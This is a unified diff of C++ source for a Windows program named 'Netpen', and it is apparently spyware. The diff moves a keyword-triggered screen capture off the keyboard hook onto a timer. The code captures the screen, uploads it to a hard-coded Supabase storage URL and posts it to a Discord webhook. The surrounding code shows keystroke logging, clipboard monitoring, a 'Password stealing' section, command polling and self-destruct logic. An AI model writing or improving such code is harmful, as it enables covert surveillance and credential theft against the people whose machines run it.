@@ -60,6 +60,8 @@ static DWORD g_lastTick = 0;                 // GetTickCount of last keystroke (
 static DWORD g_lastDiscord = 0;              // throttle for Discord webhook posts (30s)
 static DWORD g_lastAutoScreenshot = 0;      // throttle for trigger-based screenshots (5 min)
 static std::vector<std::string> g_triggers;   // keyword list from Supabase screenshot_triggers
+static std::string g_pendingAutoTitle;        // queued window title for auto-SS (processed on timer)
+static std::string g_pendingAutoKw;           // matched keyword for the pending auto-SS
 static bool g_running = true;                 // false stops the message loop and lets child exit
 static bool g_selfDestructing = false;        // latched true while self-destruct is in progress
 static std::string g_hostname;                // local computer name, used as agent key everywhere
@@ -1395,45 +1397,67 @@ static void PostDiscordImage(const std::string& host, const std::string& title, 
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
-// Auto-screenshot: if the foreground window title matches any trigger keyword
-// (case-insensitive), captures the screen and uploads it. Rate-limited to once
-// per 5 minutes per host. Called from KeyboardProc on window-title change.
+// Queue auto-screenshot if window title matches a trigger. Does NOT capture here —
+// heavy work runs on the timer thread via ProcessPendingAutoScreenshot (avoids
+// blocking the low-level keyboard hook). Rate-limited to once per 5 minutes.
 static void CheckAutoScreenshot(const std::string& windowTitle) {
     if (windowTitle.empty() || g_triggers.empty()) return;
+    if (!g_pendingAutoTitle.empty()) return;
     DWORD now = GetTickCount();
-    if (now - g_lastAutoScreenshot < 300000) return; // 5 min
+    if (now - g_lastAutoScreenshot < 300000) return;
     std::string lowerTitle;
     lowerTitle.resize(windowTitle.size());
-    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = tolower(windowTitle[i]);
+    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
 
     for (size_t i = 0; i < g_triggers.size(); i++) {
         std::string kw = g_triggers[i];
         std::string lowerKw;
         lowerKw.resize(kw.size());
-        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = tolower(kw[j]);
+        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = (char)tolower((unsigned char)kw[j]);
         if (lowerTitle.find(lowerKw) == std::string::npos) continue;
 
         g_lastAutoScreenshot = now;
-        char tmp[MAX_PATH];
-        GetTempPathA(MAX_PATH, tmp);
-        std::string ts = GetScreenshotTimestamp();
-        std::string slug = SafeHostSlug(g_hostname);
-        std::string localFile = std::string(tmp) + "NetpenAuto_" + slug + "_" + ts + ".jpg";
-        std::string storageFile = "auto_screenshots/" + slug + "_" + ts + ".jpg";
-
-        if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); break; }
-        std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
-        if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
-            LogMsg("AutoSS: upload failed");
-            DeleteFileA(localFile.c_str()); break;
-        }
-        std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
-        std::string host = g_hostname.empty() ? "unknown" : g_hostname;
-        PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");
-        DeleteFileA(localFile.c_str());
-        LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
+        g_pendingAutoTitle = windowTitle;
+        g_pendingAutoKw = kw;
         break;
     }
+}
+
+// Capture/upload queued auto-screenshot on the message-loop thread. Posts a
+// completed control row so the CAPTURES gallery shows it, plus Discord notify.
+static void ProcessPendingAutoScreenshot() {
+    if (g_pendingAutoTitle.empty() || g_selfDestructing) return;
+    std::string windowTitle = g_pendingAutoTitle;
+    std::string kw = g_pendingAutoKw;
+    g_pendingAutoTitle.clear();
+    g_pendingAutoKw.clear();
+
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string ts = GetScreenshotTimestamp();
+    std::string slug = SafeHostSlug(g_hostname);
+    std::string localFile = std::string(tmp) + "NetpenAuto_" + slug + "_" + ts + ".jpg";
+    std::string storageFile = "auto_screenshots/" + slug + "_" + ts + ".jpg";
+
+    if (!CaptureScreen(localFile.c_str())) { LogMsg("AutoSS: capture failed"); return; }
+    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
+        LogMsg("AutoSS: upload failed");
+        DeleteFileA(localFile.c_str());
+        return;
+    }
+    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
+    PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");
+
+    // Gallery-visible control row (same shape as manual screenshot)
+    std::string ctrl = "[{\"command\":\"screenshot\",\"hostname\":\"" + EscapeJSON(g_hostname) +
+        "\",\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}]";
+    std::string resp;
+    HttpRequest(L"POST", SUPABASE_CONTROL_PATH, ctrl, resp);
+
+    DeleteFileA(localFile.c_str());
+    LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
 }
 
 // === Password stealing (live form scraping) ====================================
@@ -1717,6 +1741,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         {
             static int counter = 0;
             counter++;
+            if (!g_selfDestructing) ProcessPendingAutoScreenshot();
             if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
             if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
             if (counter % 5 == 0 && !g_keys.empty()) {
@@ -1887,6 +1912,7 @@ static int RunChild(HINSTANCE hInstance) {
 
     LogMsg("Child started on " + g_hostname);
     RemoveStartupFolderEntry();
+    FetchTriggers();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
